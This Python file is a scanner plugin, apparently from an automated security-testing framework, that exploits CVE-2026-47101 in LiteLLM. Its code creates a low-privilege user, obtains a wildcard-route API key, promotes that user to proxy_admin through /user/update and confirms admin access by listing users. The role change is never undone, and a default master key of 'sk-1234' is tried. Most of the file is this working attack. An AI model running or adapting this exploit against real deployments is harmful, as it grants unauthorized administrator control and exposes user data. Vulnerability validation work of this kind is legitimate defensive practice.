#!/usr/bin/env python3
"""CVE-2026-47101 – LiteLLM Privilege Escalation via Key Generation and User Update.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-47101%20LiteLLM
  Files: ['exploit/exploit.py']
  Original upstream PoC: https://github.com/learner202649/CVE-2026-47101-PoC
  Technique:
    1. Authenticate as internal_user (low privilege).
    2. POST /key/generate with {"allowed_routes": ["/*"]} – server accepts wildcard routes
       without validating against caller's role (bug: missing route-scope enforcement).
    3. The obtained wildcard key passes route auth via fallback to key's allowed_routes.
    4. POST /user/update with {user_id, user_role: "proxy_admin"} using the wildcard key.
    5. GET /user/list with the now-admin key to verify privilege escalation.
  CVSS 3.1: 8.8 HIGH (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H).
  Fixed: LiteLLM v1.83.14.

Reference: https://nvd.nist.gov/vuln/detail/CVE-2026-47101
"""
from __future__ import annotations

import json
import urllib.error
import urllib.request

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 67,
    "cve": "CVE-2026-47101",
    "year": 2026,
    "domain": "network",
    "vendor_product": "LiteLLM < 1.83.14",
    "component": "/key/generate + /user/update – route-scope validation missing for allowed_routes wildcards",
    "type": "权限提升 (Privilege Escalation) – 低权限用户 → 管理员",
    "summary": (
        "CVE-2026-47101: LiteLLM < 1.83.14 /key/generate 端点未校验 allowed_routes 与调用者角色的匹配关系，"
        "允许 internal_user 申请带 allowed_routes=[/*] 的通配符 API key。"
        "利用该 key 可调用 /user/update 将自身角色改为 proxy_admin，实现完整权限提升。"
    ),
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-47101",
    "requires_manual_review": False,
    "affected": [
        {"vendor": "BerriAI", "product": "litellm",
         "versions": [{"version": "0", "status": "affected", "lessThan": "1.83.14"}]},
    ],
}


def _api_post(base_url: str, token: str, path: str, payload: dict, timeout: int = 10) -> dict:
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"{base_url}{path}",
        data=data,
        method="POST",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "AutosecLab/1.0",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": json.loads(r.read())}
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read())
        except Exception:
            body = str(e)
        return {"status": e.code, "body": body, "error": True}
    except Exception as exc:
        return {"status": None, "body": str(exc), "error": True}


def _api_get(base_url: str, token: str, path: str, timeout: int = 10) -> dict:
    req = urllib.request.Request(
        f"{base_url}{path}",
        headers={"Authorization": f"Bearer {token}", "User-Agent": "AutosecLab/1.0"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": json.loads(r.read())}
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read())
        except Exception:
            body = str(e)
        return {"status": e.code, "body": body, "error": True}
    except Exception as exc:
        return {"status": None, "body": str(exc), "error": True}


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 4000))
    scheme = params.get("scheme", "http")
    base_url = f"{scheme}://{target_ip}:{port}"

    # Credentials: need either internal_user_key or master_key to create one
    internal_key = params.get("internal_user_key") or params.get("api_key")
    master_key = params.get("master_key") or params.get("litellm_master_key", "sk-1234")
    user_id: str | None = params.get("user_id")

    evidence: dict = {
        "cve": "CVE-2026-47101",
        "target": base_url,
        "technique": (
            "Step 1: internal_user calls POST /key/generate with allowed_routes=[/*]. "
            "Step 2: wildcard key bypasses route auth via fallback logic. "
            "Step 3: POST /user/update with user_role=proxy_admin. "
            "Step 4: GET /user/list verifies admin access."
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-47101",
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-47101%20LiteLLM",
        "exploit_files": ["exploit/exploit.py"],
        "affected_versions": "LiteLLM < 1.83.14",
        "fixed_versions": "1.83.14+",
    }

    # Step 0: Create internal_user if no key provided
    if not internal_key:
        if not master_key:
            evidence["error"] = "Provide internal_user_key or master_key."
            return {"vulnerable": None, "evidence": evidence}

        create_resp = _api_post(base_url, master_key, "/user/new", {"role": "internal_user"})
        evidence["create_user_status"] = create_resp.get("status")
        if create_resp.get("error") or create_resp.get("status") not in (200, 201):
            evidence["detail"] = f"Failed to create internal_user: {create_resp.get('body')}"
            # Try to check if service exists at all
            health = _api_get(base_url, master_key, "/health")
            evidence["health_check"] = health
            if health.get("status") in (200, 401):
                evidence["service_present"] = True
                evidence["detail"] += " – LiteLLM service reachable (may need valid master_key)."
            else:
                evidence["service_present"] = False
            return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

        body = create_resp.get("body", {})
        internal_key = body.get("key") or body.get("token")
        user_id = str(body.get("user_id") or body.get("id") or "")
        evidence["internal_user_created"] = True
        evidence["user_id"] = user_id

    evidence["internal_key_available"] = bool(internal_key)

    # Step 1: Generate wildcard key
    key_gen_resp = _api_post(base_url, internal_key, "/key/generate",
                             {"allowed_routes": ["/*"]})
    evidence["key_generate_status"] = key_gen_resp.get("status")
    evidence["key_generate_body_preview"] = str(key_gen_resp.get("body"))[:300]

    if key_gen_resp.get("error") or key_gen_resp.get("status") not in (200, 201):
        evidence["detail"] = (
            f"POST /key/generate returned {key_gen_resp.get('status')} – "
            "server may be patched (rejects wildcard routes for internal_user) or route check is enforced."
        )
        return {"vulnerable": False, "evidence": evidence}

    body = key_gen_resp.get("body", {})
    wildcard_key = body.get("key") or body.get("token")
    if not wildcard_key:
        evidence["detail"] = "Key generation succeeded but no key in response."
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    evidence["wildcard_key_obtained"] = True
    evidence["wildcard_key_preview"] = wildcard_key[:12] + "..."

    # Step 2: Escalate to proxy_admin via /user/update
    if not user_id:
        # Try to get user_id from /user/info
        info_resp = _api_get(base_url, internal_key, "/user/info")
        if not info_resp.get("error"):
            iinfo = info_resp.get("body", {})
            user_id = str(iinfo.get("user_id") or iinfo.get("id") or "unknown")
        evidence["user_id"] = user_id

    update_resp = _api_post(base_url, wildcard_key, "/user/update",
                            {"user_id": user_id, "user_role": "proxy_admin"})
    evidence["user_update_status"] = update_resp.get("status")
    evidence["user_update_body_preview"] = str(update_resp.get("body"))[:300]

    if update_resp.get("error") or update_resp.get("status") not in (200, 201):
        evidence["detail"] = (
            f"Wildcard key obtained but /user/update returned {update_resp.get('status')}. "
            "Role escalation path may be partially patched."
        )
        return {"vulnerable": True, "evidence": evidence}  # still vulnerable (wildcard key obtained)

    evidence["role_escalated"] = True

    # Step 3: Verify admin access via /user/list
    list_resp = _api_get(base_url, wildcard_key, "/user/list")
    evidence["user_list_status"] = list_resp.get("status")
    evidence["user_list_body_preview"] = str(list_resp.get("body"))[:300]

    if list_resp.get("status") == 200:
        evidence["admin_access_verified"] = True
        evidence["detail"] = (
            "CVE-2026-47101 CONFIRMED: internal_user escalated to proxy_admin via wildcard key. "
            "GET /user/list returned 200 with admin user list."
        )
        return {"vulnerable": True, "evidence": evidence}
    else:
        evidence["detail"] = (
            "Wildcard key generated and role update succeeded, but /user/list returned "
            f"{list_resp.get('status')} (may need additional steps or endpoint differs)."
        )
        return {"vulnerable": True, "evidence": evidence}


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class LiteLLMKeyGenPrivEscAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-NET-067"
    meta_poc_name = 'CVE-2026-47101 LiteLLM Key Generation 权限提升 to proxy admin Active Validation'
    meta_cve_id = "CVE-2026-47101"
    meta_severity = "High"
    meta_protocol = "http"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["port", "scheme", "internal_user_key", "master_key", "user_id"]
    meta_profiles = ["network", "api", "privesc", "web"]
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2026-47101"
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2026-47101']
    meta_attack_surface = "LiteLLM API – 需 internal_user 凭据 – /key/generate + /user/update → proxy_admin"
    is_disruptive = False
    meta_destructive_level = "PrivEsc"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "67_LiteLLM_Key_Generation_Privilege_Escalation_Audit") if "VULN" in dir() else "67_LiteLLM_Key_Generation_Privilege_Escalation_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = LiteLLMKeyGenPrivEscAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
